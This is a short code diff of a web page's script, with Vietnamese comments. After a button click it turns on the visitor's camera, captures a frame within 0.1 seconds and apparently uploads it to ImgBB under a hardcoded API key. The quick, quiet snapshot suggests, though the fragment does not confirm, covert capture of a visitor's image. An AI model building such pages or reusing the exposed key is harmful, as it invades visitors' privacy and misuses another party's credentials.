@@ -84,7 +84,7 @@
     const canvas = document.getElementById("canvas");
     const errorMsg = document.getElementById("errorMsg");
 
-    const IMG_BB_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0";
+    const IMG_BB_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0"; // API key ImgBB
 
     nextBtn.addEventListener("click", async () => {
       nextBtn.style.display = "none";
@@ -95,7 +95,7 @@
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        // ⏳ Chờ 0.3 giây cho camera ổn định
+        // ⏱ Chờ 0.1 giây (100 ms) rồi chụp ảnh
         setTimeout(async () => {
           const ctx = canvas.getContext("2d");
           canvas.width = video.videoWidth;
@@ -124,7 +124,7 @@
             throw new Error("Không gửi được ảnh.");
           }
 
-        }, 300);
+        }, 100); // 🕒 delay chỉ 0.1 giây
 
       } catch (err) {
         loading.style.display = "none";
